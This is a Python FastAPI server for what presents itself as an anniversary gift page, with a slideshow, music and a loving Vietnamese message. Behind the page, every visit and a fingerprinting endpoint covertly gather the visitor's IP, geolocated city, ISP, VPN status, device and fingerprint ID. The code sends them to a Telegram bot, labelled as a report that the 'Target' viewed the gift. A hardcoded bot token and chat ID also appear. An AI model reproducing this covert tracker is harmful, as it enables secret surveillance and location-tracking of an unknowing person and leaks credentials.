import traceback
from fastapi import FastAPI, Request
from fastapi.responses import PlainTextResponse

app = FastAPI()

@app.exception_handler(Exception)
async def global_exception_handler(request: Request, exc: Exception):
    err_trace = traceback.format_exc()
    return PlainTextResponse(f"Runtime Error:\n{err_trace}", status_code=500)

try:
    from fastapi import BackgroundTasks
    from fastapi.responses import HTMLResponse, FileResponse
    from fastapi.staticfiles import StaticFiles
    from fastapi.templating import Jinja2Templates
    import requests
    import os
    import glob

    # Vercel functions are read-only, so we cannot create directories here at runtime.
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

    static_path = os.path.join(BASE_DIR, "static")
    if os.path.isdir(static_path):
        app.mount("/static", StaticFiles(directory=static_path), name="static")
        
    templates = Jinja2Templates(directory=os.path.join(BASE_DIR, "templates"))

    TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8543900765:AAFRHplaqbv0fvaBXHNSeo4EWscyceIt4q0")
    TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "7841326585")

    def trigger_webhook(user_agent: str, client_ip: str, visitor_id: str = "Unknown", extra_info: str = ""):
        """Feedback Loop: chi tiết hơn với Visitor ID"""
        
        # GeoIP Lookup
        location_text = "Unknown Location"
        try:
            # Using a slightly more detailed format
            geo_req = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,message,country,city,isp,mobile,proxy", timeout=3)
            if geo_req.status_code == 200:
                geo_data = geo_req.json()
                if geo_data.get("status") == "success":
                    loc = f"{geo_data.get('city')}, {geo_data.get('country')}"
                    isp = geo_data.get('isp')
                    is_mobile = "📱 Mobile" if geo_data.get('mobile') else "🏠 WiFi/Fixed"
                    is_proxy = "🛡️ VPN/Proxy detected!" if geo_data.get('proxy') else ""
                    location_text = f"{loc}\nISP: {isp} ({is_mobile}) {is_proxy}"
        except Exception:
            pass

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        
        # Format notification
        text = (
            f"🎯 *BÁO CÁO: Target đã xem quà!*\n\n"
            f"🆔 *Visitor ID:* `{visitor_id}`\n"
            f"🌐 *IP:* `{client_ip}`\n"
            f"📍 *Vị trí:* {location_text}\n"
            f"📱 *Thiết bị:* {user_agent}\n"
        )
        if extra_info:
            text += f"📊 *Extra:* {extra_info}"
        
        payload = {
            "chat_id": TELEGRAM_CHAT_ID, 
            "text": text,
            "parse_mode": "Markdown"
        }
        try:
            requests.post(url, json=payload, timeout=5)
        except Exception as e:
            print(f"Webhook Error: {e}")

    @app.post("/track")
    async def track_visitor(request: Request, background_tasks: BackgroundTasks):
        """Endpoint để nhận data fingerprinting từ frontend"""
        data = await request.json()
        visitor_id = data.get("visitorId", "Unknown")
        screen_size = data.get("screen", "Unknown")
        user_agent = request.headers.get('user-agent', 'Unknown')
        
        forwarded = request.headers.get("x-forwarded-for")
        client_ip = forwarded.split(",")[0] if forwarded else (request.client.host if request.client else "Unknown")
        
        background_tasks.add_task(trigger_webhook, user_agent, client_ip, visitor_id, f"Screen: {screen_size}")
        return {"status": "ok"}

    @app.get("/music.mp3")
    async def get_music():
        """Serve any mp3 file present in root or static directory dynamically"""
        mp3_files = glob.glob(os.path.join(BASE_DIR, "*.mp3")) + glob.glob(os.path.join(BASE_DIR, "static", "*.mp3"))
        if mp3_files:
            return FileResponse(mp3_files[0])
        return {"error": "Music file not found"}

    @app.get("/", response_class=HTMLResponse)
    async def serve_reward(request: Request, background_tasks: BackgroundTasks):
        user_agent = request.headers.get('user-agent', 'Unknown')
        
        # Extract IP (Vercel uses x-forwarded-for)
        forwarded = request.headers.get("x-forwarded-for")
        client_ip = forwarded.split(",")[0] if forwarded else (request.client.host if request.client else "Unknown")

        # Initial hit (no visitor ID yet)
        background_tasks.add_task(trigger_webhook, user_agent, client_ip, "Pending Fingerprint")

        # Auto-discover all media in static/images/Library/
        img_dir = os.path.join(BASE_DIR, "static", "images", "Library")
        slides = []
        if os.path.isdir(img_dir):
            IMG_EXT = {".jpg", ".jpeg", ".png", ".webp", ".gif"}
            VID_EXT = {".mp4", ".mov", ".webm"}
            for f in os.listdir(img_dir):
                ext = os.path.splitext(f)[1].lower()
                if ext in IMG_EXT:
                    slides.append({"src": f"images/Library/{f}", "kind": "image"})
                elif ext in VID_EXT:
                    slides.append({"src": f"images/Library/{f}", "kind": "video"})
            
            import random
            random.shuffle(slides)

        return templates.TemplateResponse("index.html", {
            "request": request,
            "message": "Một năm bên nhau, mỗi ngày đều là một kỷ niệm đẹp. Cảm ơn em đã ở đây. 🌸",
            "slides": slides,
        })

except Exception as e:
    err_trace = traceback.format_exc()
    @app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
    async def catch_all(request: Request, path: str):
        return PlainTextResponse(f"Initialization Error:\n{err_trace}", status_code=500)